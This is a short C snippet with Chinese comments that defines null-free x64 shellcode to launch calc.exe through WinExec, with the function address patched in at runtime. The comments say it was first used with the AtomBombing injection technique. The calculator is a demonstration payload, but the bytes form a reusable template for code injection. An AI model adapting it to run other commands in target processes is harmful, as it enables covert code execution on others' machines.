
// 这个是启动calc的shellcode，避免了00 00 导致的shellcode中断，首次使用与atombombing
unsigned char shellcode[] = {
    // 构建"calc.exe"字符串到栈上
    0x48, 0x31, 0xC0,               // xor rax, rax
    0x50,                           // push rax        ; null terminator
    0x68, 0x2E, 0x65, 0x78, 0x65,   // push "exe."
    0x68, 0x63, 0x61, 0x6C, 0x63,   // push "calc"

    // 设置参数并调用
    0x48, 0x89, 0xE1,               // mov rcx, rsp    ; 第一个参数
    0x6A, 0x01,                     // push 1          ; SW_SHOWNORMAL
    0x5A,                           // pop rdx         ; 第二个参数

    // 调用WinExec
    0x48, 0xB8,                     // mov rax,
    0xEF, 0xBE, 0xAD, 0xDE,        // WinExec地址
    0xEF, 0xBE, 0xAD, 0xDE,        // (需要填充)
    0x48, 0xF7, 0xD0,               // not rax
    0xFF, 0xD0                      // call rax
};

/*
     HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    UINT64 WinExecAddr = (UINT64)GetProcAddress(hKernel32, "WinExec");

    // 填充WinExec地址
    *(UINT64*)(shellcode + 22) = ~WinExecAddr;
*/